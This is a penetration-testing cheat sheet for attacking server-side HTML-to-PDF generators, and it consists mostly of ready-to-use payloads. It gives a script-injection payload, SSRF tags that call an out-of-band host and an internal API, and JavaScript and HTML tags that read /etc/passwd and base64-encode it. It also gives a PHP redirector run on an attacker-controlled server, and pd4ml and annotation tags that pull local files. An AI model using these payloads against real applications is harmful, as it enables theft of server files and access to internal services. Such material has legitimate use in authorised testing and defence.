# PDF Generation Vulnerabilities

- PDF Generators use different libraries and plugins to convert HTML content to PDF.
- This can be exploited to perform malicious activities like Server-Side XSS, SSRF etc.

### Analyze the PDF

```shell
# Install exiftool
apt install libimage-exiftool-perl

# Analyze pdf
exiftool PDF_FILE_PATH
pdfinfo PDF_FILE_PATH
```

- This will give us the PDF generation library and version. We can then look for CVE's or other exploits.

- Cross Site Scripting (XSS):

```javascript
<script>document.write(window.location)</script>
```

- SSRF:

```javascript
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

- Local file inclusion with javascript execution:

```javascript
// File read
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>

// Base64 encoding of file data
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>

// Line breaks in base64 encoded data
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

- Local file inclusion without javascript execution:

```javascript
// If the backend does not execute our injected JavaScript code,
// we must use other HTML tags to display local files.
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

```javascript
// We can use an src attribute that points to a server under 
// our control and redirects incoming requests to a local file

// Our payload on server
<?php header('Location: file://' . $_GET['url']); ?>

// Js payload on target
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

```javascript
// Annotations tag
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

```javascript
// pd4ml exploit
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

> It is essential to read the documentation of the specific PDF generation library used by our target web application to identify any potential functionality that can be exploited. Custom tags, such as pd4ml:attachment, that enable access to local files are particularly interesting.